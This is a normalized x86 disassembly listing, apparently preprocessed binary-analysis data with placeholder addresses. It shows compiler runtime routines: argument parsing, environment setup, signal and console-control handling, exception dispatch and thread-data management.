jmp r-xdata
push ebx
push esi
call sub_4cf368
add esp 0x8
sub_4cf368
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ecx + 0x2 ] 0x22
jne r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
mov cx [ ecx ]
mov [ ebx ] cx
add [ eax ] 0x2
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
mov ecx [ edx ]
mov [ ecx ] 0x22
add [ eax ] 0x4
jmp r-xdata
cmp [ ecx + 0x2 ] 0x5c
jne r-xdata
add [ edx ] 0x2
pop ebx
pop ebp
retn
mov ecx [ edx ]
mov [ ecx ] 0x5c
add [ eax ] 0x4
jmp r-xdata
sub_4cf3e0
push ebx
push 0x100
call sub_4c428c
pop ecx
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
push 0xff
mov eax [ rw-data ]
push eax
push 0x0
call GetModuleFileNameA
pop ebx
retn
push rw-data
call sub_4cec84
pop ecx
sub_4cf448
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
xor edx edx
xor ecx ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
retn
push eax
call sub_4c429c
pop ecx
sub_4cf47c
push ebx
push esi
push edi
push ebp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov ebx [ rw-data ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
xor ebp ebp
xor esi esi
mov ebx [ rw-data ]
jmp r-xdata
call GetEnvironmentStrings
mov [ rw-data ] eax
test eax eax
jne r-xdata
push eax
call sub_4c4e7c
pop ecx
test eax eax
jne r-xdata
lea ebx [ esi + 0x4 ]
push 0x4
mov [ rw-data ] ebx
inc ebx
push ebx
call sub_4c3b98
add esp 0x8
test eax eax
mov [ esp ] eax
jne r-xdata
push ebx
call sub_4c4e7c
pop ecx
mov edi eax
test eax eax
jne r-xdata
push rw-data
call sub_4cec84
pop ecx
inc esi
add ebx 0x4
dec esi
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ edi + 0x1 ]
inc esi
add ebp eax
add ebx eax
lea edi [ ebp + 0x1 ]
push edi
call sub_4c428c
pop ecx
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
xor esi esi
mov ebx [ rw-data ]
mov eax [ esp ]
mov edi eax
jmp r-xdata
xor esi esi
mov ebx [ rw-data ]
mov eax [ esp ]
mov ebp eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
mov edx [ rw-data ]
push edx
push ebx
call sub_4c4cb0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
push ebx
call sub_4c4e7c
pop ecx
mov edi eax
test eax eax
jne r-xdata
push eax
call sub_4c4e7c
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ebp ] ebx
add ebp 0x4
inc esi
inc edi
add ebx edi
jmp r-xdata
dec esi
add edi 0xfffffffc
mov eax [ ebx ]
mov [ edi ] eax
jmp r-xdata
mov edx [ esp ]
mov eax 0x1
mov [ rw-data ] edx
push eax
call sub_4c429c
pop ecx
add edi 0x4
inc esi
add ebx 0x4
sub_4cf5c8
call sub_4cf47c
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
push rw-data
call sub_4cff84
add esp 0x8
retn
push rw-data
call sub_4cec84
pop ecx
retn
sub_4cf5fc
push ebp
mov ebp esp
xor eax eax
mov edx rw-data
mov ecx [ ebp + 0x8 ]
pop ebp
retn
inc eax
add edx 0x4
cmp eax 0xa
jl r-xdata
cmp ecx [ edx ]
je r-xdata
or eax 0xffffffff
sub_4cf61c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
xor edx edx
mov [ ebp - 0x8 ] edx
call sub_4cfdac
mov esi eax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edi edi
mov edx [ ebx ]
cmp edx 0xc0000090
jg r-xdata
add edx 0x3fffff6f
cmp edx 0x5
ja r-xdata
je r-xdata
mov eax 0x1
jmp r-xdata
jmp [ edx * 4 + jump_table_4cf6b6 ]
mov ebx 0x2
mov [ ebp - 0x4 ] 0x81
mov edi 0x1
jmp r-xdata
cmp edx 0xc0000005
jg r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x84
mov edi 0x8
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x85
mov edi 0x10
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x87
mov edi 0x49
jmp r-xdata
mov [ ebp - 0x4 ] 0x7f
mov ebx 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x16
mov ebx 0x1
jmp r-xdata
mov esi [ eax + ebx * 4 ]
cmp esi 0x1
jne r-xdata
sub edx 0xc000001d
je r-xdata
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x14
mov ebx 0x1
jmp r-xdata
sub edx 0x71
je r-xdata
mov [ ebp - 0x4 ] 0xc
mov ebx 0x3
jmp r-xdata
sub edx 0x80000003
je r-xdata
xor edx edx
cmp ebx 0x1
mov [ eax + ebx * 4 ] edx
je r-xdata
mov eax 0x1
jmp r-xdata
mov ebx 0x2
mov [ ebp - 0x4 ] 0x83
mov edi 0x4
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x17
mov ebx 0x1
jmp r-xdata
dec edx
je r-xdata
call sub_4ccbc8
push 0x1f3f
mov ecx [ rw-data ]
push ecx
call sub_4ccbdc
add esp 0x8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebx * 4 + rw-data ]
push ecx
call esi
mov eax [ ebp + 0x10 ]
add esp 0xc
not edi
and [ eax + 0x20 ] edi
jmp r-xdata
cmp ebx 0x3
je r-xdata
mov [ ebp - 0x4 ] 0x18
mov ebx 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx 0x2
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
push 0x0
mov ecx [ ebx * 4 + rw-data ]
push ecx
call esi
add esp 0xc
sub_4cf814
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax 0x15
mov eax 0x2
jmp r-xdata
push eax
call sub_4cf8f0
pop ecx
mov eax 0x1
pop ebp
retn 0x4
sub_4cf83c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
mov ebx [ ebp + 0x8 ]
jne r-xdata
push ebx
call sub_4cf5fc
pop ecx
mov esi eax
inc eax
jne r-xdata
mov [ rw-data ] sub_4cf61c
push 0x1
push sub_4cf814
call SetConsoleCtrlHandler
mov [ rw-data ] 0x1
cmp ebx 0x2
je r-xdata
call sub_4ceadc
mov [ eax ] 0x13
or eax 0xffffffff
jmp r-xdata
mov ebx rw-data
jmp r-xdata
cmp ebx 0x15
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov edx [ ebp + 0xc ]
mov [ ebx + esi * 4 ] edx
call sub_4cfdac
mov edi eax
test eax eax
jne r-xdata
mov ebx [ edi + 0x28 ]
test ebx ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push 0x28
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
jne r-xdata
xor edx edx
mov eax ebx
call sub_4ceadc
mov [ eax ] 0x8
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
cmp edx 0xa
jl r-xdata
mov [ edi + 0x28 ] ebx
sub_4cf8f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0x2
je r-xdata
mov edi rw-data
jmp r-xdata
cmp ebx 0x15
jne r-xdata
push ebx
call sub_4cf5fc
pop ecx
mov esi eax
inc eax
jne r-xdata
call sub_4cfdac
mov esi eax
test eax eax
je r-xdata
mov eax [ edi + esi * 4 ]
cmp eax 0x1
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edi [ esi + 0x28 ]
test edi edi
jne r-xdata
xor eax eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor edx edx
mov [ edi + esi * 4 ] edx
xor edx edx
mov dl [ esi + rw-data ]
push 0x0
push edx
push ebx
call eax
add esp 0xc
add ebx 0xfffffff0
sub ebx 0x2
jb r-xdata
sub ebx 0x2
je r-xdata
sub ebx 0x2
je r-xdata
call sub_4cecc4
jmp r-xdata
jmp r-xdata
push 0x3
call sub_4cedc0
pop ecx
jmp r-xdata
sub_4cf9a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x100
mov [ ebp - 0x10 ] 0x1
xor eax eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov eax 0xff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx [ ebp + 0x8 ]
lea ecx [ edx + 0x4 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov esi eax
cmp esi [ ebp - 0xc ]
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
mov eax [ eax ]
je r-xdata
add esi [ ebp - 0x10 ]
cmp esi [ ebp - 0xc ]
jne r-xdata
mov edi [ eax ]
mov edi [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov edx [ eax + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
add ebx 0xfffffffa
cmp edi ebx
ja r-xdata
mov ebx edi
cmp ebx [ ebp - 0x4 ]
jae r-xdata
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
inc [ ebp - 0x8 ]
add [ ebp - 0x14 ] 0x4
mov eax esi
cmp al [ ebx + 0x1 ]
jne r-xdata
mov eax esi
cmp al [ ebx + 0x1 ]
jne r-xdata
sub ebx 0x6
cmp edi ebx
jbe r-xdata
call [ ebx + 0x2 ]
add ebx 0x6
cmp ebx [ ebp - 0x4 ]
jb r-xdata
call [ ebx + 0x2 ]
jmp r-xdata
sub_4cfa74
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] 0x1
push 0x1
push rw-data
call sub_4cf9a0
add esp 0x8
push 0x1
push rw-data
call sub_4cf9a0
add esp 0x8
call sub_4cf99c
mov edi eax
test eax eax
je r-xdata
push 0x1
push edi
call sub_4cf9a0
add esp 0x8
xor esi esi
lea ebx [ edi + 0x4 ]
jmp r-xdata
cmp esi [ edi ]
jl r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push edx
push 0x1
call [ eax + 0x18 ]
add esp 0x8
inc esi
add ebx 0x4
sub_4cfcd0
push ebx
add esp 0xffffff50
xor ebx ebx
mov [ esp + 0x1c ] 0x94
lea eax [ esp + 0x1c ]
push eax
call GetVersionExA
cmp [ esp + 0x2c ] 0x1
jne r-xdata
push 0x1c
lea eax [ esp + 0x4 ]
push eax
lea edx [ esp + 0x8 ]
push edx
call VirtualQuery
call sub_4015fc
add ebx [ esp + 0x4 ]
mov [ eax + 0xe4 ] ebx
add esp 0xb0
pop ebx
retn
mov ebx 0x10000
sub_4cfd70
push ebp
mov ebp esp
push ebx
push esi
call sub_4cfdac
mov ebx eax
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
add esi ebx
mov ebx [ esi ]
test ebx ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov eax [ ebp + 0xc ]
push eax
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov [ esi ] ebx
xor eax eax
jmp r-xdata
sub_4cfdd4
push ebx
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
push 0x60
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov edx [ ebx ]
mov [ rw-data ] edx
jmp r-xdata
test ebx ebx
je r-xdata
push 0x60
push 0x0
push ebx
call sub_4c4d44
add esp 0xc
mov ecx [ rw-data ]
push ecx
call sub_4cfff8
pop ecx
mov eax ebx
pop ebx
retn
mov [ ebx + 0x48 ] 0x1
xor edx edx
xor ecx ecx
mov [ ebx + 0x4c ] edx
xor eax eax
mov [ ebx + 0x58 ] ecx
xor edx edx
mov [ ebx + 0x2c ] eax
mov [ ebx + 0x5c ] edx
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
mov edx [ ebx + 0x50 ]
push edx
call sub_4c4d44
add esp 0xc
mov ecx [ rw-data ]
push ecx
call sub_4c428c
pop ecx
mov [ ebx + 0x50 ] eax
test eax eax
jne r-xdata
push ebx
call sub_4c429c
pop ecx
xor ebx ebx
jmp r-xdata
sub_4cfe7c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
mov edx [ rw-data ]
mov [ ebx ] edx
mov [ rw-data ] ebx
mov ecx [ rw-data ]
push ecx
call sub_4cfff8
pop ecx
pop ebx
pop ebp
retn
sub_4cfec4
push ebx
push esi
mov esi rw-data
call sub_4015fc
mov ebx [ eax + 0xe8 ]
test ebx ebx
je r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push ebx
call sub_4cfe7c
pop ecx
jmp r-xdata
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x50 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
mov eax [ esi ]
mov ebx [ eax ]
push eax
call sub_4c429c
pop ecx
mov [ esi ] ebx
push eax
call sub_4c429c
pop ecx
sub_4cff84
push ebp
mov ebp esp
push rw-data
call EnterCriticalSection
cmp [ rw-data ] 0x200
jl r-xdata
mov edx [ rw-data ]
shl edx 0x3
lea edx [ edx + edx * 2 ]
add edx rw-data
push edx
call InitializeCriticalSection
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
shl ecx 0x3
lea ecx [ ecx + ecx * 2 ]
add ecx rw-data
mov [ eax ] ecx
push rw-data
inc [ rw-data ]
call LeaveCriticalSection
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
call sub_4d0008
pop ecx
sub_4d0008
push ebp
mov ebp esp
add esp 0xffffffb0
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x50 ]
mov eax edi
mov ecx 0x4
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x50 ]
push ecx
call sub_4c4dec
add esp 0x8
lea eax [ ebp - 0x50 ]
push eax
call sub_4cec84
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4d00b3
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
xor edx edx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
mov [ ebp - 0x8 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov si [ edx + 0x4 ]
test si 0x20
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
push 0x56
call sub_4d01ae
mov ebx eax
xor eax eax
pop ecx
xor ecx ecx
mov [ ebx ] eax
mov edx [ ebp - 0x4 ]
xor eax eax
mov [ ebx + 0x4 ] edx
xor edx edx
mov [ ebx + 0xc ] 0x2
mov [ ebx + 0x10 ] 0x4
mov [ ebx + 0x18 ] si
mov [ ebx + 0x1a ] 0x0
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] edx
mov [ ebx + 0x1c ] sub_4d0225
xor ecx ecx
xor eax eax
mov [ ebx + 0x34 ] ecx
mov [ ebx + 0x38 ] eax
xor edx edx
xor ecx ecx
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x24 ] ecx
mov [ ebx + 0x45 ] 0x0
mov [ ebx + 0x44 ] 0x1
mov eax [ ebp + 0xc ]
mov [ ebx + 0x46 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ebx + 0x4a ] edx
lea edx [ ebx + 0x52 ]
mov ecx [ ebp + 0x14 ]
mov [ ebx + 0x4e ] ecx
push 0x4
push eax
push edx
call sub_4c4cb0
add esp 0xc
mov eax ebx
push 0x103
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub_4d01ae
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4c428c
pop ecx
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
cmp ebx 0x80
ja r-xdata
call sub_4ced34
call sub_4015fc
test [ eax + 0x4c ] 0x1
je r-xdata
call sub_4015fc
or [ eax + 0x4c ] 0x1
call sub_4015fc
mov eax [ eax + 0x5c ]
pop ebx
pop ebp
retn
sub_4d01f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4015fc
cmp ebx [ eax + 0x5c ]
jne r-xdata
push ebx
call sub_4c429c
pop ecx
pop ebx
pop ebp
retn
call sub_4015fc
and [ eax + 0x4c ] 0xfffffffe
pop ebx
pop ebp
retn
sub_4d0225
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebx + 0x52 ]
call sub_4c5fee
push ebx
call sub_4d01f8
pop ecx
pop ebx
pop ebp
retn
sub_4d0244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push 0x0
push esi
push edi
call sub_4c5800
add esp 0x10
test eax eax
je r-xdata
movzx edx [ edi + 0x4 ]
mov [ ebp - 0x4 ] edx
movzx ebx [ esi + 0x4 ]
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax 0x1
jmp r-xdata
test bl 0x20
je r-xdata
test bl 0x20
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl 0x10
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ esi + 0x8 ]
push edi
call sub_4c5800
add esp 0x10
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x20
jne r-xdata
xor eax eax
test [ ebp + 0x14 ] 0x1
je r-xdata
mov esi [ esi + 0x8 ]
movzx ebx [ esi + 0x4 ]
test bl 0x10
jne r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp + 0xc ]
push 0x1
push [ esi + 0x8 ]
push [ edi + 0x8 ]
call sub_4c5800
add esp 0x10
test eax eax
je r-xdata
push 0x18f
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ ebp - 0x4 ] 0x10
jne r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push esi
push edi
call sub_4c5800
add esp 0x10
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
test bl 0x40
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
test bh 0x1
jne r-xdata
test bh 0x2
jne r-xdata
test [ ebp - 0x3 ] 0x1
jne r-xdata
mov eax 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x2
jne r-xdata
sub_4d0353
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
test bh 0x1
mov esi [ ebp + 0x8 ]
jne r-xdata
test bl 0x80
je r-xdata
test bl 0x20
je r-xdata
test bh 0x10
je r-xdata
push 0x1ff
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push 0x1fd
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
and ebx 0x7
dec ebx
je r-xdata
and ebx 0x7
dec ebx
je r-xdata
push edi
push esi
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
dec ebx
je r-xdata
push edi
push 0x0
push esi
call [ ebp + 0x10 ]
add esp 0xc
jmp r-xdata
dec ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push esi
push edi
call [ ebp + 0x10 ]
jmp r-xdata
dec ebx
je r-xdata
push 0x0
push edi
push esi
call [ ebp + 0x10 ]
jmp r-xdata
dec ebx
je r-xdata
mov edx edi
mov eax esi
call [ ebp + 0x10 ]
jmp r-xdata
sub ebx 0x2
je r-xdata
mov ecx edi
xor edx edx
mov eax esi
call [ ebp + 0x10 ]
jmp r-xdata
sub ebx 0x2
je r-xdata
push edi
push esi
call [ ebp + 0x10 ]
jmp r-xdata
jmp r-xdata
push edi
push 0x0
push esi
call [ ebp + 0x10 ]
jmp r-xdata
jmp r-xdata
mov edx rw-data
test edx edx
je r-xdata
mov eax rw-data
test eax eax
je r-xdata
push 0x256
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push 0x22a
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
jmp r-xdata
sub_4d0461
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
test edx edx
je r-xdata
pop ebp
retn
jmp r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
inc eax
sub_4d0479
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ ebp + 0x1c ] 0x0
mov esi [ ebp + 0x18 ]
je r-xdata
xor ebx ebx
mov ebx 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
or ebx 0x80
test [ ebp + 0x10 ] 0x2
je r-xdata
test esi 0x80
je r-xdata
push [ ebp + 0xc ]
call sub_4c56ec
pop ecx
mov edi eax
push edi
call sub_4d0461
pop ecx
push eax
push edi
push [ ebp + 0x14 ]
push 0x3
push 0x0
call sub_4c5ddc
add esp 0x14
and esi 0x7
dec esi
je r-xdata
push 0x2b5
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
add esp 0x8
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec esi
je r-xdata
mov edx ebx
mov eax [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub esi 0x2
je r-xdata
push ebx
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
jmp r-xdata
mov ecx rw-data
test ecx ecx
je r-xdata
push 0x2dc
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub_4d0549
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
test bl 0x80
je r-xdata
and ebx 0x7
dec ebx
je r-xdata
push 0x2e4
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ecx
pop ebx
pop ebp
retn
dec ebx
je r-xdata
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
dec ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
sub ebx 0x2
je r-xdata
push [ ebp + 0x8 ]
call [ ebp + 0xc ]
pop ebx
pop ebp
retn
jmp r-xdata
mov edx rw-data
test edx edx
je r-xdata
pop ebx
pop ebp
retn
push 0x30b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub_4d05c7
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov eax rw-data
call sub_4c517c
mov esi [ ebp + 0x8 ]
call sub_4015fc
or [ eax + 0x4c ] 0x2
call sub_4015fc
test esi esi
je r-xdata
xor edx edx
movzx edx [ esi + 0x6 ]
add edx esi
jmp r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x2c ] 0x0
je r-xdata
mov [ eax + 0x58 ] edx
call sub_4015fc
mov ecx [ ebp + 0x20 ]
mov [ eax + 0x54 ] ecx
call sub_4015fc
mov edx [ ebp + 0x24 ]
test esi esi
mov [ eax + 0x50 ] edx
jne r-xdata
test [ ebp + 0x1c ] 0x4
je r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
push 0x35b
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
test [ ebp + 0x1c ] 0x4
jne r-xdata
mov [ ebp - 0x28 ] esi
movzx edi [ esi + 0x4 ]
test edi 0x2
mov ebx [ esi ]
je r-xdata
test esi esi
je r-xdata
test [ esi + 0x4 ] 0x30
je r-xdata
test [ esi + 0xc ] 0x80
jne r-xdata
xor eax eax
mov eax [ esi + 0xc ]
jmp r-xdata
mov [ ebp - 0x28 ] esi
test esi esi
je r-xdata
test [ esi + 0x4 ] 0x30
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x4 ] 0x2
je r-xdata
lea eax [ ebx + 0x52 ]
push eax
call sub_4d01ae
pop ecx
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x4 ] esi
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x1c ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x10 ] ebx
mov edx [ ebp - 0x30 ]
mov [ edx + 0x18 ] di
mov ecx [ ebp - 0x30 ]
mov ax [ ebp - 0x2c ]
mov [ ecx + 0x1a ] ax
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x28 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp + 0x10 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx + 0x28 ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx + 0x2c ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x1c ] sub_4d01f8
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x20 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp + 0x24 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ebp + 0x14 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x18 ]
mov [ edx + 0x24 ] ecx
mov eax [ ebp - 0x30 ]
mov [ eax + 0x45 ] 0x0
mov edx [ ebp - 0x30 ]
mov [ edx + 0x44 ] 0x1
push ebx
push [ ebp + 0xc ]
mov ecx [ ebp - 0x30 ]
add ecx 0x52
push ecx
call sub_4c4cb0
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0x1
je r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x28 ] ecx
test edi 0x30
mov [ ebp - 0x2c ] eax
je r-xdata
sub [ ebp + 0x28 ] 0x4
push [ ebp - 0x28 ]
push [ ebp + 0x3a ]
push [ ebp + 0x39 ]
push [ ebp + 0x37 ]
push [ ebp + 0x38 ]
push [ ebp + 0x35 ]
push [ ebp + 0xc ]
push [ ebp + 0x28 ]
push esp
push 0x8
push 0xc0000025
push 0xeedfade
mov eax [ ebp + 0x2c ]
test eax eax
jne r-xdata
test [ esi + 0x4 ] 0x30
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x4 ] 0x2
je r-xdata
mov ecx [ esi + 0x8 ]
test [ ecx + 0xc ] 0x80
jne r-xdata
push esi
call sub_4c56ec
mov ebx eax
